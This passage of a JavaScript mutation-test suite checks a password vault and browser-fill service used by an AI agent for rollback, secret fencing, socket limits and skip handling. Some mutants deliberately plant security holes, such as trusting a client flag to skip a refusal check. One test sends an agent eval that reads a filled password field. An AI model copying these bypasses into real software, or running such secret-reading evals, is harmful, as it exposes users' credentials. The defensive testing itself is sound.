          'A4 (legacy read): filling and listing a .388 v:1 record normalizes idempotently in memory (schema:2), performs 0 secretPut writes, and leaves .388 rollback bytes intact',
          { schema: parsedLegacy?.schema, secretPutCountOnFill, masterReadsAfterFill });

        // Mutant 22 (A4): omit top-level `password` mirror in `textOf` -> `.388` `recordOf` returns null on rollback!
        const m22BlSrc = editAnchor(blSrc,
          'return JSON.stringify({ ...r, schema: 2, password: compatPw });',
          'return JSON.stringify({ ...r, schema: 2 });'
        , "src/browser-login.js");
        const BL_M22 = m22BlSrc !== blSrc ? MUT.load('src/browser-login.js', m22BlSrc, 'a4-rollback-password-omitted') : null;
        if (BL_M22) {
          const mutDrop = master388RecordOf(BL_M22.textOf(rOwn));
          ok(mOwn !== null && mutDrop === null,
            'MUTANT 22 RED (A4 rollback-password-omitted): omitting top-level password mirror breaks .388 recordOf rollback (returns null)',
            { realOk: Boolean(mOwn), mutDrop });
        } else ok(false, 'MUTANT 22 RED (A4): anchor not found');
      }

      // Mutant 20 (A2): restore `req.body?.vaultFill === true` skipping `liveFillRefusal` in `src/routes/browser.js` -> `eval` with `vaultFill: true` returns 200!
      {
        const m20RbSrc = editAnchor(rbSrc,
          '    if (await liveFillRefusal(res, k, f, r.profile && r.profile.id, req, verb)) return;',
          '    if (req.body?.vaultFill !== true && await liveFillRefusal(res, k, f, r.profile && r.profile.id, req, verb)) return;'
        , "src/routes/browser.js", 'first');
        const RB_M20 = m20RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m20RbSrc, 'a2-body-vaultfill-bypasses-fence') : null;
        if (RB_M20 && typeof RB_M20.setup === 'function') {
          const express = require(path.join(REPO, 'node_modules/express'));
          const prof20 = { id: 'bp-000020bb', label: 'M20' };
          fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
          const w20 = Dm.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000020aa', sessionId: 's-m20' }], leaseCountOf: () => 1, logins: logR24 });
          await w20.arm('bp-000020bb');
          w20.noteActiveTab({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, tidR24);
          await w20.fillVaultField({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
          const k20 = {
            clock: () => Date.now(),
            profileByRef: (r) => (r === 'bp-000020bb' || r === 'shop' ? prof20 : null),
            profile: (id) => (id === 'bp-000020bb' ? prof20 : null),
            setFor: () => ({ attachments: [{ profileId: 'bp-000020bb', alias: 'shop', label: 'M20', isDefault: true }], handles: ['shop'] }),
            resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: 'bp-000020bb', alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
            attach: async () => ({ profile: prof20, browser: { state: 'ready' }, lease: { profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
            cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
            socketRootOf: () => ({ socketDir: path.join(dirM10, 'ab20'), runtimeDir: dirM10 }),
            configFileFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            tell() {},
            leasesFor: () => [{ profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20' }],
            statusFor: () => ({ ephemeral: null, leases: [{ profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20' }] }),
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            onLease: () => () => {},
            saveLoginFenceState() {},
            loginFenceStateOf: () => null,
            loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M20', action }),
          };
          const tok20 = 'vsst_' + crypto.randomBytes(12).toString('hex');
          const sess20 = { agentToken: tok20, _browserKey: 'bk-000020aa', _browserVariant: 'D', name: 'M20 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
          RB_M20.setup({ keeper: k20, activeSessions: new Map([['s-m20', sess20]]), dialogs: w20, logins: logR24, tasksForSession: () => [] });
          const app20 = express();
          app20.use(express.json());
          app20.use(RB_M20.router);
          const srv20 = await new Promise((r) => { const s = app20.listen(0, '127.0.0.1', () => r(s)); });
          try {
            const resp = await fetch(`http://127.0.0.1:${srv20.address().port}/api/agent/browser/resolve`, {
              method: 'POST',
              headers: { 'content-type': 'application/json', authorization: `Bearer ${tok20}` },
              body: JSON.stringify({ handle: 'shop', argv: ['eval', 'document.querySelector("#pw").value'], wrapper: true, vaultFill: true }),
            });
            ok(resp.status === 200,
              'MUTANT 20 RED (A2 body-vaultfill-bypasses-fence): trusting req.body.vaultFill===true lets eval bypass liveFillRefusal with HTTP 200',
              { status: resp.status });
          } finally {
            srv20.close();
            w20.shutdown();
            LF.clearAllFilledSecrets();
          }
        } else ok(false, 'MUTANT 20 RED (A2): anchor not found');
      }

      // A3: Hub `noteSnapshot` 2048-char name cap + 3 short-socket failure modes (`ECONNREFUSED`, `attach` error, non-upgrading TCP peer with 0 lingering sockets) + `ax_nodes_exceeded` + Mutant 21 RED!
      {
        const net = require('node:net');
        const { WebSocketServer, WebSocket } = require(path.join(REPO, 'node_modules/ws'));

        // 1. Hub `noteSnapshot` enforces `2048`-char name cap and `128`-char role cap on its own (independent of CLI)
        let capturedQuery = null;
        const capWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => capWss.once('listening', r));
        const capPort = capWss.address().port;
        capWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-cap' } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 1 } }));
            else if (m.method === 'Runtime.evaluate') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-1' } } }));
            else if (m.method === 'Accessibility.queryAXTree') {
              if (!capturedQuery) capturedQuery = m.params;
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: [] } }));
            } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
          });
        });
        try {
          const wCap = Dm.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          await wCap.arm('bp-cap');
          const overLongName = 'N'.repeat(10_000);
          const overLongRole = 'textbox' + 'R'.repeat(400);
          const snapCapRes = await wCap.noteSnapshot(
            { profileId: 'bp-cap', browserKey: 'bk-mr24' },
            { parsedRefs: [{ ref: '@e1', role: overLongRole, name: overLongName, nth: 0 }], targetId: tidR24 },
          );
          fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
          // Inspect what `noteSnapshot` stored by resolving `@e1` through a short server if we check `snapCapRes`:
          // even simpler, run `fillVaultField` on a custom keeper pointing at `capWss` — or check `capturedQuery`!
          wCap.shutdown();
          const kCap = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${capPort}` }) };
          const wCap2 = Dm.create({ keeper: kCap, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          // `capWss` also needs `Target.getTargets` and `openIsolatedOrigin` to reach `resolveSnapshotRef`:
          capWss.removeAllListeners('connection');
          capWss.on('connection', (sock) => {
            sock.on('message', (raw) => {
              const m = JSON.parse(String(raw));
              if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
              else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-CAP', type: 'page', url: 'https://shop.example.test/login', title: 'Cap' }] } }));
              else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-CAP', type: 'page', url: 'https://shop.example.test/login' } } }));
              else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-cap' } }));
              else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'F-CAP', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' } } } }));
              else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 7 } }));
              else if (m.method === 'Runtime.evaluate') {
                if (m.params?.returnByValue === false) sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-cap' } } }));
                else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
              } else if (m.method === 'Accessibility.queryAXTree') {
                if (!capturedQuery) capturedQuery = m.params;
                sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: [] } }));
              } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            });
          });
          await wCap2.arm('bp-cap2');
          await wCap2.noteSnapshot(
            { profileId: 'bp-cap2', browserKey: 'bk-mr24' },
            { parsedRefs: [{ ref: '@e1', role: overLongRole, name: overLongName, nth: 0 }], targetId: 'T-CAP' },
          );
          await wCap2.fillVaultField({ profileId: 'bp-cap2', browserKey: 'bk-mr24' }, {
            targetId: 'T-CAP', target: '@e1', spec: 'shop.example.test#alice/password', checkOnly: true, facts: { conversationKeys: ['conv-mr24'] },
          });
          wCap2.shutdown();
          ok(snapCapRes.ok && Boolean(capturedQuery) && capturedQuery.accessibleName.length === 2048 && capturedQuery.role.length === 128,
            'A3 (Hub noteSnapshot cap): Hub itself truncates @ref name to 2048 chars and role to 128 chars without relying on CLI',
            { nameLen: capturedQuery?.accessibleName?.length, roleLen: capturedQuery?.role?.length });
        } finally {
          await new Promise((r) => capWss.close(r));
        }

        // 2. Standing watch server (`maxPayload: 16 MiB` client) that answers `queryAXTree` with `8,000 × 2,048`-char nodes (`16.71 MiB`) + 3 short-socket failure peers!
        let watchAxCalls = 0;
        const bigNodesJson = (() => {
          const bigName = 'X'.repeat(2048);
          const nodes = Array.from({ length: 8000 }, (_, i) => ({
            nodeId: String(i + 1), ignored: false, role: { type: 'role', value: 'textbox' }, name: { type: 'computedString', value: bigName }, backendDOMNodeId: i + 100,
          }));
          return JSON.stringify({ nodes });
        })();
        const watchWss = new WebSocketServer({ port: 0, host: '127.0.0.1', maxPayload: 64 * 1024 * 1024 });
        await new Promise((r) => watchWss.once('listening', r));
        watchWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Accessibility.queryAXTree') {
              watchAxCalls++;
              sock.send(`{"id":${m.id},"result":${bigNodesJson}}`);
            } else if (m.method === 'Page.createIsolatedWorld') {
              sock.send(JSON.stringify({ id: m.id, result: { executionContextId: 1 } }));
            } else if (m.method === 'Runtime.evaluate') {
              sock.send(JSON.stringify({ id: m.id, result: { result: { objectId: 'obj-w' } } }));
            } else if (m.method === 'Page.getFrameTree') {
              sock.send(JSON.stringify({ id: m.id, result: { frameTree: { frame: { id: 'F-TOP' } } } }));
            } else {
              sock.send(JSON.stringify({ id: m.id, result: {} }));
            }
          });
        });

        const attachErrWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => attachErrWss.once('listening', r));
        attachErrWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, error: { code: -32000, message: 'No target with given id' } }));
          });
        });

        const maxNodesWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => maxNodesWss.once('listening', r));
        maxNodesWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-mn' } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 1 } }));
            else if (m.method === 'Runtime.evaluate') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-mn' } } }));
            else if (m.method === 'Accessibility.queryAXTree') {
              const nodes9k = Array.from({ length: 9000 }, (_, i) => ({ nodeId: String(i + 1), backendDOMNodeId: i + 1 }));
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: nodes9k } }));
            } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
          });
        });

        const rawTcpSockets = new Set();
        const noUpgradeTcp = net.createServer((sock) => {
          rawTcpSockets.add(sock);
          sock.resume();
          sock.on('close', () => rawTcpSockets.delete(sock));
          sock.on('error', () => rawTcpSockets.delete(sock));
        });
        await new Promise((r) => noUpgradeTcp.listen(0, '127.0.0.1', r));

        const standingWatch = new WebSocket(`ws://127.0.0.1:${watchWss.address().port}`, { maxPayload: 16 * 1024 * 1024 });
        standingWatch.on('error', () => {});
        await new Promise((r) => standingWatch.once('open', r));
        let wSeq = 0;
        const wPend = new Map();
        standingWatch.on('message', (d) => {
          const m = JSON.parse(String(d));
          if (m.id && wPend.has(m.id)) { const fn = wPend.get(m.id); wPend.delete(m.id); fn(m); }
        });
        standingWatch.on('close', () => {
          for (const [, fn] of wPend) fn({ error: { message: 'watch closed' } });
          wPend.clear();
        });
        const watchCall = (method, params = {}) => new Promise((res) => {
          if (standingWatch.readyState !== 1) return res({ error: { message: 'watch not open' } });
          const id = ++wSeq;
          wPend.set(id, res);
          standingWatch.send(JSON.stringify({ id, method, params }));
        });

        try {
          const dp = await deadPort();
          const ftStub = { frame: { id: 'F-TOP' } };
          const refDesc = { ref: '@e1', role: 'textbox', name: 'Email', nth: 0 };

          // Leg (1): ECONNREFUSED on short socket
          const rRefused = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${dp}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
          });
          // Leg (2): Target.attachToTarget CDP error on short socket
          const rAttachErr = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${attachErrWss.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
          });
          // Leg (3): TCP accepts connection and NEVER sends HTTP 101 upgrade
          const rNoUpgrade = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${noUpgradeTcp.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 300,
          });
          await new Promise((r) => setTimeout(r, 60));
          const lingeringTcpAfter = rawTcpSockets.size;
          // Leg (4): >8,192 nodes names `ax_nodes_exceeded`
          const rNodesCap = await LF.resolveSnapshotRef({
            wsUrl: `ws://127.0.0.1:${maxNodesWss.address().port}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 1000, maxNodes: 8192,
          });

          ok(!rRefused.ok && rRefused.code === 'target_not_found' && rRefused.reason === 'ax_connect_failed' && /short accessibility connection failed/i.test(rRefused.error)
            && !rAttachErr.ok && rAttachErr.code === 'target_not_found' && rAttachErr.reason === 'ax_connect_failed' && /attach failed/i.test(rAttachErr.error)
            && !rNoUpgrade.ok && rNoUpgrade.code === 'target_not_found' && rNoUpgrade.reason === 'ax_timeout'
            && !rNodesCap.ok && rNodesCap.code === 'target_not_found' && rNodesCap.reason === 'ax_nodes_exceeded' && /8192 accessibility nodes/.test(rNodesCap.error)
            && watchAxCalls === 0 && standingWatch.readyState === 1 && lingeringTcpAfter === 0,
            'A3 (short-socket-only): ECONNREFUSED, attach error, and non-upgrading TCP peer all refuse target_not_found naming cause with 0 watch calls, watch open, and 0 lingering TCP sockets',
            { rRefused, rAttachErr, rNoUpgrade, rNodesCap, watchAxCalls, watchState: standingWatch.readyState, lingeringTcpAfter });

          // Mutant 21 (A3): restore r24's fallback onto `call` (standing watch) when short socket fails -> 8,000 × 2,048-char reply (16.71 MiB) closes standing watch with 1006!
          const m21LfSrc = editAnchor(editAnchor(editAnchor(editAnchor(lfSrc,
            
              'async function resolveSnapshotRef({\n  wsUrl = \'\',\n  WebSocketImpl = null,\n  targetId = null,',
              'async function resolveSnapshotRef({\n  wsUrl = \'\',\n  WebSocketImpl = null,\n  call = null,\n  targetId = null,'
            , "src/server/browser-login-fill.js"),
            
              "    const cause = String((shortSess && shortSess.error) || 'connection failed').slice(0, 160);\n    return {\n      ok: false,\n      code: 'target_not_found',\n      reason: 'ax_connect_failed',\n      error: `element ${key} could not be resolved because the short accessibility connection failed (${cause}) — pass a CSS selector to fill --vault instead`,\n    };\n  }\n\n  const send = shortSess.send;\n  const isTooLarge = shortSess.isTooLarge;\n  const isTimedOut = shortSess.isTimedOut;",
              "  }\n  const useShort = shortSess && shortSess.ok ? shortSess : null;\n  const send = useShort ? useShort.send : makeSend(call, null, undefined);\n  const isTooLarge = useShort ? useShort.isTooLarge : () => false;\n  const isTimedOut = useShort ? useShort.isTimedOut : () => false;"
            , "src/server/browser-login-fill.js"),
            
              '    const tgts = await shortSess.browserSend(\'Target.getTargets\', {});',
              '    const tgts = useShort ? await useShort.browserSend(\'Target.getTargets\', {}) : null;'
            , "src/server/browser-login-fill.js"),
            
              '  } finally {\n    await shortSess.close();\n  }',
              '  } finally {\n    if (shortSess && shortSess.close) await shortSess.close();\n  }'
            , "src/server/browser-login-fill.js");
          const LF_M21 = m21LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m21LfSrc, 'a3-short-socket-falls-back-to-watch') : null;
          if (LF_M21) {
            let closeCode = 0;
            standingWatch.once('close', (c) => { closeCode = c; });
            await LF_M21.resolveSnapshotRef({
              wsUrl: `ws://127.0.0.1:${dp}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
            });
            await untilFact(() => standingWatch.readyState === 3 && closeCode !== 0, 'MUTANT 21: the standing watch closed');   // the flake census r2: was a 40 ms guess
            ok(watchAxCalls === 1 && standingWatch.readyState === 3 && closeCode === 1006,
              'MUTANT 21 RED (A3 short-socket-falls-back-to-watch): falling back to standing watch sends queryAXTree over watch and 16.71 MiB reply drops watch with code 1006',
              { watchAxCalls, watchState: standingWatch.readyState, closeCode });
          } else ok(false, 'MUTANT 21 RED (A3): anchor not found');
        } finally {
          try { standingWatch.terminate(); } catch {}
          for (const s of rawTcpSockets) { try { s.destroy(); } catch {} }
          await new Promise((r) => noUpgradeTcp.close(r));
          await new Promise((r) => attachErrWss.close(r));
          await new Promise((r) => maxNodesWss.close(r));
          await new Promise((r) => watchWss.close(r));
        }
      }

      // A5 (r26 Minor 3): ALL 4 browser/vault heavy suites (`test-vault-login-chrome`, `test-browser-site-reset-chrome`,
      // `test-browser-mediation-chrome`, `test-vault-paste-chrome`) exit `2` with `SKIPPED:` (never `ALL PASS`, never `0`) when prerequisites are absent!
      {
        const { spawn } = require('node:child_process');
        const bareBin = path.join(dirM10, 'bare-node-bin');
        fs.mkdirSync(bareBin, { recursive: true });
        fs.symlinkSync(process.execPath, path.join(bareBin, 'node'));
        const runBare = (scriptRel, extraArgs = []) => new Promise((resolve) => {
          const ch = spawn(process.execPath, [path.join(REPO, scriptRel), ...extraArgs], {
            cwd: REPO,
            env: {
              PATH: `${bareBin}:/usr/bin`,
              HOME: dirM10,
              TMPDIR: os.tmpdir(),
              VS_NO_REAL_CLI: '1',
            },
          });
          let out = '';
          ch.stdout.on('data', (d) => { out += d; });
          ch.stderr.on('data', (d) => { out += d; });
          const tm = setTimeout(() => { try { ch.kill('SIGKILL'); } catch {} }, 8000);
          ch.on('close', (status) => { clearTimeout(tm); resolve({ status, out: out.trim() }); });
        });
        const [rVl, rSr, rMedAb, rMedCh, rVpCh] = await Promise.all([
          runBare('scripts/test-vault-login-chrome.mjs'),
          runBare('scripts/test-browser-site-reset-chrome.mjs'),
          runBare('scripts/test-browser-mediation-chrome.mjs'),
          runBare('scripts/test-browser-mediation-chrome.mjs', ['--chrome', '/nonexistent/chrome-bin']),
          runBare('scripts/test-vault-paste-chrome.mjs', ['--chrome', '/nonexistent/chrome-bin']),
        ]);
        ok([rVl, rSr, rMedAb, rMedCh, rVpCh].every((r) => r.status === 2 && /SKIPPED:/i.test(r.out) && !/ALL PASS/i.test(r.out)),
          'A5 (r26 Minor 3): all 4 heavy suites (vault-login, site-reset, mediation, vault-paste) print SKIPPED (never ALL PASS) and exit 2 when agent-browser or chrome is missing',
          { rVl, rSr, rMedAb, rMedCh, rVpCh });
      }

      // ── r26 COMPULSORY 1: Every owner write/read door works on every `.356`–`.390` record shape + rollback round-trip + MUTANT 24 RED ──
      {
        const { execFileSync } = require('node:child_process');
        const VT = require(path.join(REPO, 'src/server/vault-totp.js'));
        const VPD = require(path.join(REPO, 'src/server/vault-paste-door.js'));
        const VC = require(path.join(REPO, 'src/server/vault-contents.js'));

        const dirC1 = path.join(dirM10, 'r26-compulsory-1');
        fs.mkdirSync(dirC1, { recursive: true });

        // Load real `.390` (`05082bbd0`) `src/browser-login.js` + `src/server/browser-logins.js` when git object exists
        // (with exact `.390` flat-schema fallback if running in a shallow clone / git-less export tarball).
        let BL390 = null, LM390 = null;
        if (process.env.VS_TEST_NO_GIT_390 !== '1') {
          try {
            const bl390Raw = execFileSync('git', ['show', '05082bbd0:src/browser-login.js'], { cwd: REPO, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
            const lm390Raw = execFileSync('git', ['show', '05082bbd0:src/server/browser-logins.js'], { cwd: REPO, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
            const bl390Path = path.join(dirC1, 'bl390.cjs');
            const lm390Path = path.join(dirC1, 'lm390.cjs');
            fs.writeFileSync(bl390Path, bl390Raw.replace("require('./grant-model.js')", `require(${JSON.stringify(path.join(REPO, 'src/grant-model.js'))})`));
            fs.writeFileSync(
              lm390Path,
              lm390Raw
                .replace("require('../browser-login.js')", `require(${JSON.stringify(bl390Path)})`)
                .replace("require('../grant-model.js')", `require(${JSON.stringify(path.join(REPO, 'src/grant-model.js'))})`)
                .replace("require('./grants-store.js')", `require(${JSON.stringify(path.join(REPO, 'src/server/grants-store.js'))})`),
            );
            BL390 = require(bl390Path);
            LM390 = require(lm390Path);
          } catch (e) {
            BL390 = null;
            LM390 = null;
            console.log(`  ⊘ SKIP: the real .390 modules (05082bbd0) are not in this checkout — the hand-written .390 shape stands in (${String((e && e.message) || e).split('\n')[0].slice(0, 120)}) (r5051 (b))`);
          }
        } else console.log('  ⊘ SKIP: the real .390 modules are not read (VS_TEST_NO_GIT_390=1) — the hand-written .390 shape stands in (r5051 (b))');
        const oracle390Label = (BL390 && LM390) ? '真实 .390 模块' : '手写形态（git 对象不在）';

        const populateMasterVault = async (vaultDir) => {
          fs.mkdirSync(vaultDir, { recursive: true });
          const vpw = 'R26#MasterVault9';
          const recentNow = Date.now() - 60_000;
          // Step A: Write `rbuser` with tip (`r26`) first, so `.390` can overwrite it in Step B (proving rollback -> `.390` rewrite -> tip).
          {
            const engPre = VE.create({ dataDir: vaultDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            await engPre.setup(vpw);
            const gPre = GS.create({ memory: true });
            const logPre = Lm.create({ vault: engPre, grants: () => gPre, log: () => {} });
            const totpPre = VT.create({ dataDir: vaultDir, vault: engPre, log: () => {} });
            totpPre.addEntry({ name: 'shop2fa', seed: 'JBSWY3DPEHPK3PXP', issuer: 'Shop', account: 'tuser' }, { who: 'owner' });
            logPre.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbTipInitPw!0' }, { who: 'owner' });
            engPre.close();
          }
          // Step B: Open with `.390` (`05082bbd0`) and write every `.356`–`.390` record shape + overwrite `rbuser`!
          {
            const eng390 = VE.create({ dataDir: vaultDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            await eng390.unlock(vpw);
            if (BL390 && LM390) {
              const g390 = GS.create({ memory: true });
              const log390 = LM390.create({ vault: eng390, grants: () => g390, log: () => {} });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'Alice390Pw!1' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'tuser', password: 'Tuser390Pw!1', totpName: 'shop2fa' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevOld390Pw!1' }, { who: 'owner' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevCur390Pw!2' }, { who: 'owner' });
              log390.addAgent({ origin: 'https://shop.example.test', username: 'aguser', password: 'AgUser390Pw!1' }, { owner: 'conv-ag', actor: 'Agent 390' });
              log390.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbMaster390Pw!2' }, { who: 'owner' });

              const reg1Rec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'reg1', password: 'Reg1PendingPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#reg1', BL390.textOf(reg1Rec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const reg2Rec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'reg2', password: 'Reg2PendingPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#reg2', BL390.textOf(reg2Rec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const regCardRec = BL390.newRecord({ origin: 'https://shop.example.test', username: 'regcard', password: 'RegCardPw!1', source: 'vault-minted', now: recentNow, conversation: 'conv-reg', pending: 'register' });
              eng390.secretPut('web-login:https://shop.example.test#regcard', BL390.textOf(regCardRec), { kind: 'vault-minted', actor: 'conv-reg', pending: 'register' });

              const carlBase = BL390.newRecord({ origin: 'https://shop.example.test', username: 'carl', password: 'CarlOld390Pw!1', source: 'owner', now: recentNow - 10_000 });
              const carlChg = BL390.changedRecord(carlBase, 'CarlNew390Pw!2', { source: 'vault-minted', now: recentNow, pending: 'change' });
              eng390.secretPut('web-login:https://shop.example.test#carl', BL390.textOf(carlChg), { kind: 'vault-minted', pending: 'change' });
            } else {
              const putFlat = (u, obj, meta = {}) => eng390.secretPut(`web-login:https://shop.example.test#${u}`, JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: u, createdAt: recentNow, ...obj }), { kind: obj.source || 'owner', ...meta });
              putFlat('alice', { by: 'owner', source: 'owner', strength: 'unknown', password: 'Alice390Pw!1' });
              putFlat('tuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'Tuser390Pw!1', totpName: 'shop2fa' });
              putFlat('prevuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'PrevCur390Pw!2', previous: { password: 'PrevOld390Pw!1', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } });
              putFlat('aguser', { by: 'agent', source: 'agent-typed', strength: 'unknown', password: 'AgUser390Pw!1' }, { owner: 'conv-ag', actor: 'Agent 390' });
              putFlat('rbuser', { by: 'owner', source: 'owner', strength: 'unknown', password: 'RbMaster390Pw!2', previous: { password: 'RbTipInitPw!0', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } });
              putFlat('reg1', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'Reg1PendingPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('reg2', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'Reg2PendingPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('regcard', { by: 'agent', source: 'vault-minted', strength: 'generated', password: 'RegCardPw!1', pending: 'register' }, { actor: 'conv-reg', pending: 'register' });
              putFlat('carl', { by: 'owner', source: 'vault-minted', strength: 'generated', password: 'CarlNew390Pw!2', pending: 'change', previous: { password: 'CarlOld390Pw!1', source: 'owner', strength: 'unknown', replacedAt: recentNow - 5_000 } }, { pending: 'change' });
            }
            eng390.close();
          }
          return vpw;
        };

        const vaultGreenDir = path.join(dirC1, 'green');
        const vaultRedDir = path.join(dirC1, 'red-m24');
        const vpwC1 = await populateMasterVault(vaultGreenDir);
        fs.cpSync(vaultGreenDir, vaultRedDir, { recursive: true });
        const engTip = VE.create({ dataDir: vaultGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
        await engTip.unlock(vpwC1);
        try {
          let tipSecretPuts = 0;
          const origPut = engTip.secretPut.bind(engTip);
          engTip.secretPut = (...a) => { tipSecretPuts++; return origPut(...a); };

          const gTip = GS.create({ memory: true });
          const totpTip = VT.create({ dataDir: vaultGreenDir, vault: engTip, log: () => {} });
          const todosMap = new Map();
          const userTodosStub = {
            add: (_sk, it) => { const id = 'ut-' + (todosMap.size + 1); const rec = { id, status: 'open', ...it }; todosMap.set(id, rec); return rec; },
            get: (id) => todosMap.get(id) || null,
            snapshot: () => ({ open: [...todosMap.values()].filter((x) => x.status === 'open') }),
            setStatus: (id, st) => { const r = todosMap.get(id); if (r) r.status = st; },
